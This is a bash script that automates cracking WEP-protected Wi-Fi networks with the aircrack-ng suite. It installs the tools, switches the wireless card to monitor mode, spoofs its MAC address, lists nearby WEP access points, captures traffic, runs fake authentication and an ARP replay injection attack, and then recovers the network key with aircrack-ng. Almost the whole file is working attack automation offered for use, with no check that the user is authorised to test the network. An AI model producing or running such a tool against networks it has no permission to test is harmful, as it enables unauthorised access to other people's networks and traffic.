#!/bin/bash


function resolve_dependencies {
AIRCRACK=$(command -v aircrack-ng)
NMCLI=$(command -v nmcli)
MACCHANGER=$(command -v macchanger)
XTERM=$(command -v xterm)

if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z "$XTERM" ]]; then

    DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo ${f:5:${#f}-13}; done;
    )

    case $DISTRO in
        arch )
            INSTALL="pacman -S "
            ;;
        gentoo )
            INSTALL="emerge -a "
            ;;
        centos )
            INSTALL="apt install "
            ;;
        redhat )
            INSTALL="dnf install "
            ;;
        debian )
            INSTALL="apt install "
            ;;
        OpenSUSE )
            INSTALL="zypper install "
            ;;
        fedora )
            INSTALL="dnf install "
            ;;
        * )
            echo -ne "Unable to determine Linux Distribution!"
            exit 1
    esac

    if [[ -z "$AIRCRACK" ]]; then
        AIRCRACK="aircrack-ng"
    elif [[ -z "$NMCLI" ]]; then
        NMCLI="networkmanager"
    elif [[ -z "$MACCHANGER" ]]; then
        MACCHANGER="macchanger"
    elif [[ -z "$XTERM" ]]; then
        XTERM="xterm"
    fi

    $INSTALL $AIRCRACK $NMCLI $MACCHANGER $XTERM

else
    :
fi
}
function choose_mode {
    read -p "Begin ? [yn] : " ANSWER 
    if [[ $ANSWER = y ]]; then
        echo "1) WEP" 
        echo "2) WPA1/2"
        echo
        read -p "Select Cracking Mode : " MODE
            if [[ $MODE = 1 ]]; then
                MODE=WEP
                list_APs
                crack_wep
            elif [[ $MODE = 2 ]]; then
                MODE=WPA
                list_APs
                #crack_wpa
                echo "WPA cracking is work in progress..."
                exit 0
            fi
    else
        check_wlan
    fi
}
function list_APs {
    readarray -t LINES < <(nmcli -t -f SSID,CHAN,BSSID,SECURITY,SIGNAL dev wifi list | grep $MODE)
    if [[ -z $LINES ]]; then
        echo "No WEP Networks found."
        exit 0
    else
        echo
        echo "Select an AP"
        echo "SSID  CHAN    BSSID   SECURITY    SIGNAL"
        select CHOICE in "${LINES[@]}"; do
            [[ -n $CHOICE ]] || { echo "Invalid choice. Try again." >&2; continue; }
            break
        done
        read -r AP <<< "$CHOICE)"
        clear
        echo "You picked ($AP"
        BSSID=$(echo $AP | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
        CHAN=$(echo $AP | awk -F ':' '{print $2}')
        ESSID=$(echo $AP | awk -F ':' '{print $1}')
        echo "AP Name: "$ESSID  
        echo "AP chanel: "$CHAN
        echo "AP MAC: "$BSSID 
    fi
}
#function crack_wpa {}
function crack_wep {
    clear
    IFACE=$(ls /sys/class/net | grep $IFACE) >> /dev/null
    AIRODUMP=$(printf " --bssid %s -c %d -w %s %s" "$BSSID" "$CHAN" "$ESSID" "$IFACE")
    AIREPLAY1=$(printf " -1 30 -q 5 -a %s -h %s -e %s %s " "$BSSID" "$NEWMAC" "$ESSID" "$IFACE")
    AIREPLAY3=$(printf " -3  -b %s -h %s %s" "$BSSID" "$NEWMAC" "$IFACE")

    COMMAND1="airodump-ng $AIRODUMP"
    COMMAND2="aireplay-ng $AIREPLAY1"
    COMMAND3="aireplay-ng $AIREPLAY3"

    env -u SESSION_MANAGER xterm -hold -e $COMMAND1 &
    YN=n
    while [ $YN != y ]; do
        echo "Attempting to Associate..."
        sleep .5
        env -u SESSION_MANAGER xterm -hold -e $COMMAND2 &
        sleep .5
        echo "Was the Assosication successful ? [yn] "
        read YN
        PID=$(ps aux | grep aireplay | grep -v grep | awk -F ' ' '{print $2}')
        kill $PID
    done
    echo "Initiating ARP Replay attack..."
    env -u SESSION_MANAGER xterm -hold -e $COMMAND3 &
    echo
    echo "Wait for #Data in airodump-ng to reach at least 15k"
    sleep 2
    read -p "Try cracking $ESSID now ? [yn] : " ANSWER 
    if [[ $ANSWER = y ]]; then
       readarray -t FILES < <(find `pwd` -name "*.cap")
       if [[ -z $FILES ]]; then
            echo "No .cap files found."
            exit 0
        else
            echo "Select a .cap file to crack"
            select CHOICE in "${FILES[@]}"; do
                [[ -n $CHOICE ]] || { echo "Invalid choice. Try again." >&2; continue; }
                break
            done
            read -r CAP <<< "$CHOICE"
        fi
        echo $CAP
        COMMAND4="aircrack-ng $CAP"
        env -u SESSION_MANAGER xterm -hold -e $COMMAND4 &
    fi

    read -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ?" ASR
    if [[ $ASR = y ]]; then
       rm -f $ESSID*.cap
       rm -f $ESSID*.netxml
       rm -f $ESSID*.csv
       rm -f replay*.cap
    else
        :
    fi
}
function show_mac {
    list_ifaces
    MAC=$(iw $IFACE info | grep addr | awk '{print $2}')
    echo "$IFACE MAC : $MAC"
}
function unset_mon {
    if [[ -z $STATE ]]; then
        echo 
        echo "Monitor mode was not set on $IFACE."
        exit 0
    else
        echo
        echo "Disabling Monitor Mode for $IFACE..."
        echo
        echo "Bringing $IFACE down..."
        ifconfig $IFACE down >> /dev/null
        echo "Reverting MAC address to factory default..."
        macchanger -p $IFACE  >> /dev/null
        echo "Bringing $IFACE up..."
        ifconfig $IFACE up >> /dev/null 
        echo "Disabling monitor mode for $IFACE..."
        airmon-ng stop $IFACE >> /dev/null 
        echo "$IFACE is no longer in monitor mode." 
    fi
}
function set_mon {
    if [[ -z $STATE ]]; then
        echo
        echo "Setting $IFACE in Monitor Mode..."
        echo
        echo "Running airmon-ng..."
        airmon-ng start $IFACE >> /dev/null 
        IFACE=$(ls /sys/class/net | grep $IFACE) >> /dev/null
        echo "Bringing $IFACE down..."
        ifconfig $IFACE down >> /dev/null 
        echo "Changing MAC address for $IFACE"
        macchanger -m 00:11:22:33:44:55 $IFACE >> /dev/null 
        echo "Bringing $IFACE up..."
        ifconfig $IFACE up >> /dev/null 
        NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
        echo "$IFACE is in monitor mode and it's MAC address is: $NEWMAC"
    else
        echo 
        echo "$IFACE already in monitor mode."
        NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
        choose_mode
    fi
}
function menu {
    clear
    echo "1) Start Monitor Mode"
    echo "2) Stop Monitor Mode"
    echo "v) View APs"
    echo "s) Show WLAN interface MAC"
    echo "q) Abort"
    echo 
    PROMPT='Choose : '
    echo -n "$PROMPT"
}
function list_ifaces {
    readarray -t IFACES < <(ls /sys/class/net | grep wl)
    echo "Select an interface "
    select CHOICE in "${IFACES[@]}"; do
        [[ -n $CHOICE ]] || { echo "Invalid choice. Try again." >&2; continue; }
        break
    done
    read -r IFACE <<< "$CHOICE"
    echo "You picked : $IFACE"
}
function single_interface {
    STATE=$(ls /sys/class/net | grep mon)
    IFACE=$(ls /sys/class/net | grep wl)
    MAC=$(iw $IFACE info | grep addr | awk '{print $2}')
    menu
    while read -n1 CHAR   
    do
        case $CHAR in
            1 )
                set_mon
                choose_mode
                break 
                ;;
            2 )
                unset_mon
                break
                ;;
            v )
                nmcli dev wifi list
                break
                ;;
            s )
                echo
                echo "$IFACE : $MAC"
                break
                ;;
            q )
                exit 0
                ;;
            * )
                echo -ne "\nInvalid character '$CHAR' entered. $PROMPT"
        esac
    done
}
function multiple_interfaces {
    clear
    echo "You have multiple interfaces"
    list_ifaces
    echo
    if [[ -z "$IFACE" ]]; then
        exit 0
    else
        menu
        while read -n1 CHAR
        do
            case $CHAR in
                1 )
                    STATE=$(echo $IFACE | grep mon)
                    set_mon
                    choose_mode
                    break
                    ;;
                2 )
                    STATE=$(echo $IFACE | grep mon)
                    unset_mon
                    break
                    ;;
                v )
                    nmcli dev wifi list 
                    break
                    ;;
                s )
                    show_mac
                    break
                    ;;
                q )
                    exit 0
                    ;;
                * )
                    echo -ne "\nInvalid character '$CHAR' entered. $PROMPT"
            esac
        done
    fi
}
function check_root {
    if [[ "$EUID" -ne 0 ]]; then
        echo "This script must be run as root" 1>&2
        exit 1
    fi
}
function check_wlan {
IFACENUM=$(ls /sys/class/net/ | grep wl |  wc -l)

if [[ "$IFACENUM" -gt 1 ]]; then
    multiple_interfaces
elif [[ "$IFACENUM" -eq 1 ]]; then
    single_interface
elif [[ "$IFACENUM" -eq 0 ]]; then
    echo "No WLAN interfaces found."
fi
}
resolve_dependencies
check_root
check_wlan